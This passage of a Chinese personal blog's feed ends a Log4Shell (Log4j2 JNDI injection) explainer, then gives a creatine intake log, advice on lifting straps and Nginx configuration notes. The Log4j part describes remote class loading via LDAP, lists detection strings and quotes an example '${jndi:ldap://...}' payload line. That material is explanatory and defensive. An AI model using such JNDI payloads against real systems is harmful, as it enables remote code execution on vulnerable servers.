<code>${}</code>，知道这个里面包裹的内容是要单独处理的。</p><p>进一步解析，发现是JNDI扩展内容。</p><p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p><p>最后，调用具体负责LDAP的模块去请求对应的数据。</p><p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p><p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p><p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p><blockquote><p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p></blockquote><p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong></p><p>危险在哪里？</p><p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那不就完犊子了吗？</p><p>还没看懂？没关系，我画了一张图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/bug_step.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这就是鼎鼎大名的JNDI注入攻击！</p><p>其实除了LDAP，还有RMI的方式，有兴趣的可以了解下。</p><h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><p>其实这种攻击手法不是这一次出现了，早在2016的blackhat大会上，就有大佬披露了这种攻击方式。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/usa2016.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>回过头来看，问题的核心在于：</p><p>Java允许通过JNDI远程去下载一个class文件来加载对象，如果这个远程地址是自己的服务器，那还好说，如果是可以被外界来指定的地址，那就要出大问题！</p><p>前面的例子中，一直用的127.0.0.1来代替LDAP服务器地址，那如果输入的User-Agent字符串中不是这个地址，而是一个恶意服务器地址呢？</p><h1 id="影响规模"><a href="#影响规模" class="headerlink" title="影响规模"></a>影响规模</h1><p>这一次漏洞的影响面之所以如此之大，主要还是log4j2的使用面实在是太广了。</p><p>一方面现在Java技术栈在Web、后端开发、大数据等领域应用非常广泛，国内除了阿里巴巴、京东、美团等一大片以Java为主要技术栈的公司外，还有多如牛毛的中小企业选择Java。</p><p>另一方面，还有好多像kafka、elasticsearch、flink这样的大量中间件都是用Java语言开发的。</p><p>在上面这些开发过程中，大量使用了log4j2作为日志输出。只要一个不留神，输出的日志有外部输入混进来，那直接就是远程代码执行RCE，灭顶之灾！</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>新版的log4j2已经修复了这个问题，大家赶紧升级。</p><p>下面是log4j2官网中关于JNDI lookup的说明：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/log4j/log4j2_jndi1.webp" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我通过搜索引擎找到了缓存的12月10号前的快照，大家对比一下，比起下面这个缓存，上面那一版多了哪些东西？</p><p><img src="/img/posts/log4j/log4j2_jndi2.webp" alt=""></p><p>答案是：修复后的log4j2在JNDI lookup中增加了很多的限制：</p><blockquote><ol><li>默认不再支持二次跳转（也就是命名引用）的方式获取对象</li><li>只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</li><li>只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</li></ol></blockquote><p>以上几道限制，算是彻底封锁了通过打印日志去远程加载class的这条路了。</p><h1 id="影响的组件"><a href="#影响的组件" class="headerlink" title="影响的组件"></a>影响的组件</h1><p>可能的受影响应用及组件（包括但不限于）如下：</p><ul><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li><li>Apache Struts2</li><li>srping-boot-strater-log4j2</li><li>Elasticsearch</li><li>flume</li><li>dubbo</li><li>Redis</li><li>logstash</li><li>kafka</li></ul><p><strong>幸运的是大家目前普遍使用的<code>springboot</code>中默认使用日志组件<code>logback</code>没有这个问题。</strong></p><p>更多组件可参考如下链接：<a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1</a></p><h1 id="攻击检测"><a href="#攻击检测" class="headerlink" title="攻击检测"></a>攻击检测</h1><ol><li>可以通过检查日志中是否存在 “jndi:ldap://”、“jndi:rmi” 等字符来发现可能的攻击行为。攻击者在利用前通常采用dnslog方式进行扫描、探测，对于常见利用方式可通过应用系统报错日志中的”javax.naming.CommunicationException”、”javax.naming.NamingException: problem generating object using object factory”、”Error looking up JNDI resource”关键字进行排查。</li><li>攻击者的数据包中可能存在：”${jndi:}” 字样，攻击代码举例如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">"$&#123;jndi:ldap://127.0.0.1:1389/test&#125;"</span>);</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;相信大家这两天应该被这么一条新闻刷屏了吧：&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overla
      
    
    </summary>
    
    
      <category term="java" scheme="https://blog.smilexin.cn/tags/java/"/>
    
      <category term="漏洞" scheme="https://blog.smilexin.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Log4j" scheme="https://blog.smilexin.cn/tags/Log4j/"/>
    
  </entry>
  
  <entry>
    <title>肌酸服用记录</title>
    <link href="https://blog.smilexin.cn/2021/11/15/%E8%82%8C%E9%85%B8%E6%9C%8D%E7%94%A8%E8%AE%B0%E5%BD%95.html"/>
    <id>https://blog.smilexin.cn/2021/11/15/肌酸服用记录.html</id>
    <published>2021-11-14T16:00:00.000Z</published>
    <updated>2022-01-25T06:38:31.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-11-08-星期一"><a href="#2021-11-08-星期一" class="headerlink" title="2021-11-08 星期一"></a>2021-11-08 星期一</h1><p>练前肌酸3g，练后肌酸3g</p><h1 id="2021-11-09-星期二"><a href="#2021-11-09-星期二" class="headerlink" title="2021-11-09 星期二"></a>2021-11-09 星期二</h1><p>早上肌酸3g，练前肌酸3g，练后肌酸3g</p><h1 id="2021-11-10-星期三"><a href="#2021-11-10-星期三" class="headerlink" title="2021-11-10 星期三"></a>2021-11-10 星期三</h1><p>早上肌酸3g，练前肌酸3g，练后肌酸3g</p><h1 id="2021-11-11-星期四"><a href="#2021-11-11-星期四" class="headerlink" title="2021-11-11 星期四"></a>2021-11-11 星期四</h1><p>早上肌酸3g，练后肌酸3g</p><h1 id="2021-11-12-星期五"><a href="#2021-11-12-星期五" class="headerlink" title="2021-11-12 星期五"></a>2021-11-12 星期五</h1><p>早上肌酸3g，练前肌酸3g，晚3g</p><h1 id="2021-11-13-星期六（冲击期）"><a href="#2021-11-13-星期六（冲击期）" class="headerlink" title="2021-11-13 星期六（冲击期）"></a>2021-11-13 星期六（冲击期）</h1><p>练前肌酸3g 练后3g</p><h1 id="2021-11-15-星期一-（维持期）"><a href="#2021-11-15-星期一-（维持期）" class="headerlink" title="2021-11-15 星期一 （维持期）"></a>2021-11-15 星期一 （维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-16-星期二-（维持期）"><a href="#2021-11-16-星期二-（维持期）" class="headerlink" title="2021-11-16 星期二 （维持期）"></a>2021-11-16 星期二 （维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-17-星期三-（维持期）"><a href="#2021-11-17-星期三-（维持期）" class="headerlink" title="2021-11-17 星期三 （维持期）"></a>2021-11-17 星期三 （维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-18-星期四-（维持期）"><a href="#2021-11-18-星期四-（维持期）" class="headerlink" title="2021-11-18 星期四 （维持期）"></a>2021-11-18 星期四 （维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-18-星期五-（维持期）"><a href="#2021-11-18-星期五-（维持期）" class="headerlink" title="2021-11-18 星期五 （维持期）"></a>2021-11-18 星期五 （维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-18-星期六-（维持期）"><a href="#2021-11-18-星期六-（维持期）" class="headerlink" title="2021-11-18 星期六 （维持期）"></a>2021-11-18 星期六 （维持期）</h1><p>肌酸3g</p><h1 id="2021-11-18-星期天-（维持期）"><a href="#2021-11-18-星期天-（维持期）" class="headerlink" title="2021-11-18 星期天 （维持期）"></a>2021-11-18 星期天 （维持期）</h1><p>肌酸3g</p><h1 id="2021-11-22-星期一（维持期）"><a href="#2021-11-22-星期一（维持期）" class="headerlink" title="2021-11-22 星期一（维持期）"></a>2021-11-22 星期一（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-23-星期二（维持期）"><a href="#2021-11-23-星期二（维持期）" class="headerlink" title="2021-11-23 星期二（维持期）"></a>2021-11-23 星期二（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-24-星期三（维持期）"><a href="#2021-11-24-星期三（维持期）" class="headerlink" title="2021-11-24 星期三（维持期）"></a>2021-11-24 星期三（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-25-星期四（维持期）"><a href="#2021-11-25-星期四（维持期）" class="headerlink" title="2021-11-25 星期四（维持期）"></a>2021-11-25 星期四（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-25-星期五（维持期）"><a href="#2021-11-25-星期五（维持期）" class="headerlink" title="2021-11-25 星期五（维持期）"></a>2021-11-25 星期五（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-29-星期一（维持期）"><a href="#2021-11-29-星期一（维持期）" class="headerlink" title="2021-11-29 星期一（维持期）"></a>2021-11-29 星期一（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-11-30（维持期）"><a href="#2021-11-30（维持期）" class="headerlink" title="2021-11-30（维持期）"></a>2021-11-30（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-01（维持期）"><a href="#2021-12-01（维持期）" class="headerlink" title="2021-12-01（维持期）"></a>2021-12-01（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-02（维持期）"><a href="#2021-12-02（维持期）" class="headerlink" title="2021-12-02（维持期）"></a>2021-12-02（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-03（维持期）"><a href="#2021-12-03（维持期）" class="headerlink" title="2021-12-03（维持期）"></a>2021-12-03（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-05（维持期）"><a href="#2021-12-05（维持期）" class="headerlink" title="2021-12-05（维持期）"></a>2021-12-05（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-06（维持期）"><a href="#2021-12-06（维持期）" class="headerlink" title="2021-12-06（维持期）"></a>2021-12-06（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-07（维持期）"><a href="#2021-12-07（维持期）" class="headerlink" title="2021-12-07（维持期）"></a>2021-12-07（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-08（维持期）"><a href="#2021-12-08（维持期）" class="headerlink" title="2021-12-08（维持期）"></a>2021-12-08（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-09（维持期）"><a href="#2021-12-09（维持期）" class="headerlink" title="2021-12-09（维持期）"></a>2021-12-09（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-11（维持期）"><a href="#2021-12-11（维持期）" class="headerlink" title="2021-12-11（维持期）"></a>2021-12-11（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-13（维持期）"><a href="#2021-12-13（维持期）" class="headerlink" title="2021-12-13（维持期）"></a>2021-12-13（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-14（维持期）"><a href="#2021-12-14（维持期）" class="headerlink" title="2021-12-14（维持期）"></a>2021-12-14（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-17（维持期）"><a href="#2021-12-17（维持期）" class="headerlink" title="2021-12-17（维持期）"></a>2021-12-17（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-20（维持期）"><a href="#2021-12-20（维持期）" class="headerlink" title="2021-12-20（维持期）"></a>2021-12-20（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-21（维持期）"><a href="#2021-12-21（维持期）" class="headerlink" title="2021-12-21（维持期）"></a>2021-12-21（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-22（维持期）"><a href="#2021-12-22（维持期）" class="headerlink" title="2021-12-22（维持期）"></a>2021-12-22（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-24（维持期）"><a href="#2021-12-24（维持期）" class="headerlink" title="2021-12-24（维持期）"></a>2021-12-24（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-26（维持期）"><a href="#2021-12-26（维持期）" class="headerlink" title="2021-12-26（维持期）"></a>2021-12-26（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-28（维持期）"><a href="#2021-12-28（维持期）" class="headerlink" title="2021-12-28（维持期）"></a>2021-12-28（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-29（维持期）"><a href="#2021-12-29（维持期）" class="headerlink" title="2021-12-29（维持期）"></a>2021-12-29（维持期）</h1><p>练前肌酸3g</p><h1 id="2021-12-31（维持期）"><a href="#2021-12-31（维持期）" class="headerlink" title="2021-12-31（维持期）"></a>2021-12-31（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-02（维持期）"><a href="#2022-01-02（维持期）" class="headerlink" title="2022-01-02（维持期）"></a>2022-01-02（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-04（维持期）"><a href="#2022-01-04（维持期）" class="headerlink" title="2022-01-04（维持期）"></a>2022-01-04（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-06（维持期）"><a href="#2022-01-06（维持期）" class="headerlink" title="2022-01-06（维持期）"></a>2022-01-06（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-07（维持期）"><a href="#2022-01-07（维持期）" class="headerlink" title="2022-01-07（维持期）"></a>2022-01-07（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-11（维持期）"><a href="#2022-01-11（维持期）" class="headerlink" title="2022-01-11（维持期）"></a>2022-01-11（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-12（维持期）"><a href="#2022-01-12（维持期）" class="headerlink" title="2022-01-12（维持期）"></a>2022-01-12（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-13（维持期）"><a href="#2022-01-13（维持期）" class="headerlink" title="2022-01-13（维持期）"></a>2022-01-13（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-14（维持期）"><a href="#2022-01-14（维持期）" class="headerlink" title="2022-01-14（维持期）"></a>2022-01-14（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-17（维持期）"><a href="#2022-01-17（维持期）" class="headerlink" title="2022-01-17（维持期）"></a>2022-01-17（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-19（维持期）"><a href="#2022-01-19（维持期）" class="headerlink" title="2022-01-19（维持期）"></a>2022-01-19（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-24（维持期）"><a href="#2022-01-24（维持期）" class="headerlink" title="2022-01-24（维持期）"></a>2022-01-24（维持期）</h1><p>练前肌酸3g</p><h1 id="2022-01-25（维持期）"><a href="#2022-01-25（维持期）" class="headerlink" title="2022-01-25（维持期）"></a>2022-01-25（维持期）</h1><p>练前肌酸3g</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021-11-08-星期一&quot;&gt;&lt;a href=&quot;#2021-11-08-星期一&quot; class=&quot;headerlink&quot; title=&quot;2021-11-08 星期一&quot;&gt;&lt;/a&gt;2021-11-08 星期一&lt;/h1&gt;&lt;p&gt;练前肌酸3g，练后肌酸3g&lt;/p&gt;
&lt;h1 
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>该不该使用握力带</title>
    <link href="https://blog.smilexin.cn/2021/11/12/%E8%AF%A5%E4%B8%8D%E8%AF%A5%E4%BD%BF%E7%94%A8%E6%8F%A1%E5%8A%9B%E5%B8%A6.html"/>
    <id>https://blog.smilexin.cn/2021/11/12/该不该使用握力带.html</id>
    <published>2021-11-11T16:00:00.000Z</published>
    <updated>2021-11-12T09:27:14.172Z</updated>
    
    <content type="html"><![CDATA[<p>如果你能轻松握住的话，那就用手握好了。大部分人大部分时候都不需要握力带。但如果你在做5/3/1一类的计划，里面含有AMRAP组(尽可能做多次数)，那就没理由不用握力带了，尤其是如果你的握力会比背部髋部先力竭的话。不用握力带的话会让你完成不了本能完成的次数，训练效果也大打折扣。如果你在做Sheiko一类的超高容量的计划的话，也可以用握力带。随着你手开始疲劳，动作质量也会下滑，而这些计划要求动作完美执行。频率也很重要。如果你的握力力竭了的话，接下来两三天可能都无法完全恢复。如果你每周拉超过两次，手开始酸时就用握力带吧没关系。</p><p>奥林匹克举重</p><p>我不懂举重，下面内容是我听一些举重教练讲的。</p><p>高翻时不要用握力带，如果杠铃一不小心从三角肌前束上滚下来的话，你可能无法松手导致手被拉伤。抓举可以用握力带，一般来说，如果你高翻能用锁握握住的话，抓举也问题不大。热身组时不要用握力带，大重量组前几组不要用，避免忘了不用握力带的感觉，但其他时候用用无妨。</p><p>辅助动作</p><p>除了高次数的划船或者罗马尼亚硬拉之外，握力带没有什么使用的必要。我几乎没见过有人能用正确动作做划船还能用到必须用握力带的重量，但正常轻重量下如果做超高次数的话，握力的确可能成问题，可以使用握力带帮助一下。罗马尼亚硬拉同理。大重量哑铃划船也值得用握力带。至于耸肩，我个人把这个动作当做握力训练(我用架上拉、宽握硬拉练斜方肌)，所以不用握力带。如果引体向上做20次以上的话，用握力带也很有用。</p><p>体能训练</p><p>我见过有傻X用握力带把自己绑在跑步机上。如果你也这么做的话，你真是病的不轻。至于农夫行走，我一般也是当做握力训练，但如果做大重量长距离的话，就有必要用握力带了。</p><p>总的来说，我还是挺喜欢握力带的。不要仅仅因为你不喜欢用手握就用握力带，但如果有需要的话，尽管用就是。说实话，我认为，如果你硬拉从不用握力带的话，你很可能在限制自己进步，高次数或架上拉都是很好的训练方式(可以看看大力士比赛选手硬拉水平)，不用握力带的话，你很难全力去练这两种方式。如果你的握力成了短板的话，花时间练握力即可。就算是最差的情况下，你也不过是个握力弱但硬拉强的人，不用握力带你可能是个握力和硬拉都很弱的人。</p><p>如果你还是坚持不该用握力带的话，也无所谓，我没说必须要用握力带。但我认为不应该建议别人不要用握力带。握力带只是个能让你更好的训练的工具，有什么不好的?</p><p><strong>简单来说，如果你感觉用握力带能带起更大的重量，更好的轰炸目标肌肉。就用握力带吧。反正我练背喜欢用握力带☺</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;如果你能轻松握住的话，那就用手握好了。大部分人大部分时候都不需要握力带。但如果你在做5/3/1一类的计划，里面含有AMRAP组(尽可能做多次数)，那就没理由不用握力带了，尤其是如果你的握力会比背部髋部先力竭的话。不用握力带的话会让你完成不了本能完成的次数，训练效果也大打折扣
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>Nginx常用配置记录</title>
    <link href="https://blog.smilexin.cn/2021/11/10/Nginx%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95.html"/>
    <id>https://blog.smilexin.cn/2021/11/10/Nginx常用配置记录.html</id>
    <published>2021-11-09T16:00:00.000Z</published>
    <updated>2021-11-10T03:03:57.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装-Nginx"><a href="#安装-Nginx" class="headerlink" title="安装 Nginx"></a>安装 Nginx</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 更新软件包，请确保服务器的软件包已经是最新的。</span><br><span class="line">sudo yum update -y</span><br><span class="line"></span><br><span class="line"># 添加 Nginx 源</span><br><span class="line">sudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br><span class="line"></span><br><span class="line"># 安装 Nginx</span><br><span class="line">sudo yum install -y nginx</span><br><span class="line"></span><br><span class="line"># 启动 Nginx</span><br><span class="line">sudo systemctl start nginx.service</span><br><span class="line"></span><br><span class="line"># 设置开机自启 Nginx</span><br><span class="line">sudo systemctl enable nginx.service</span><br></pre></td></tr></table></figure><h1 id="配置-Nginx"><a href="#配置-Nginx" class="headerlink" title="配置 Nginx"></a>配置 Nginx</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 使用 vim 编辑创建 文件名.conf</span><br><span class="line">vim /etc/nginx/conf.d/文件名.conf</span><br><span class="line"></span><br><span class="line">添加配置1（配置1和2可以同事监听80端口，绑定不同域名，实现一台服务器nginx同时配置多个前端网站，多个域名空格隔开）</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name 域名1 域名2 localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header HOST $host;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">        proxy_pass http://127.0.0.1:端口/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">添加配置2</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name 域名1 域名2 localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header HOST $host;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">        proxy_pass http://127.0.0.1:端口/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">代理静态网站 root指定磁盘目录</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  域名1 域名2 多个域名空格隔开 localhost;</span><br><span class="line">    location / &#123;</span><br><span class="line">       try_files $uri $uri/ /index.html;</span><br><span class="line">       root D:\test-web;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">检查配置是否有误</span><br><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">重载/重启 Nginx 配置</span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line">Stop 是快速关闭，不管有没有正在处理的请求</span><br><span class="line">nginx -s stop</span><br><span class="line"></span><br><span class="line">Quit 是一个优雅的关闭方式，Nginx在退出前完成已经接受的连接请求。</span><br><span class="line">nginx -s quit</span><br><span class="line"></span><br><span class="line">查看nginx</span><br><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure><h1 id="错误及解决办法"><a href="#错误及解决办法" class="headerlink" title="错误及解决办法"></a>错误及解决办法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">不能访问子路径错误：</span><br><span class="line">location /flow &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:9083/;</span><br><span class="line">&#125;</span><br><span class="line">修改：</span><br><span class="line">location /flow/ &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:9083/;</span><br><span class="line">&#125;</span><br><span class="line">解决：/flow 后面加个/</span><br><span class="line"></span><br><span class="line">配置多个前端代码/a/ /b/不能访问</span><br><span class="line">解决：把/a/ /b/放在根目录下面 （就是只有一个根目录，不过根目录里面可以放很多项目文件夹）</span><br><span class="line"></span><br><span class="line">去掉请求后面的斜杠 添加在location节点里面 解决浏览器请求拼接到接口前面的诡异问题</span><br><span class="line">rewrite ^/(.*)/$ /$1 permanent;</span><br></pre></td></tr></table></figure><h1 id="前后端分离项目部署"><a href="#前后端分离项目部署" class="headerlink" title="前后端分离项目部署"></a>前后端分离项目部署</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">##前端配置</span><br><span class="line">location /gov_flow &#123;</span><br><span class="line">##放再nginx下的/content/gov_flow目录</span><br><span class="line">alias /var/html/gov_flow;</span><br><span class="line">try_files $uri $uri/ /index.html;</span><br><span class="line">index index.html;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">##后端接口配置            </span><br><span class="line">location /stage-prod-api/ &#123;</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_pass http://flow:9083/;</span><br><span class="line">&#125;</span><br><span class="line">location /stage-test-api/&#123;</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_pass http://localhost:8080/;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">#两个后端项目接口合并成一个 给前端访问9991</span><br><span class="line">server &#123;</span><br><span class="line">    listen       9991;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    location /yqt/&#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8888/yqt/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /ad/&#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8090/ad/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="nginx配置ssl证书示例1"><a href="#nginx配置ssl证书示例1" class="headerlink" title="nginx配置ssl证书示例1"></a>nginx配置ssl证书示例1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 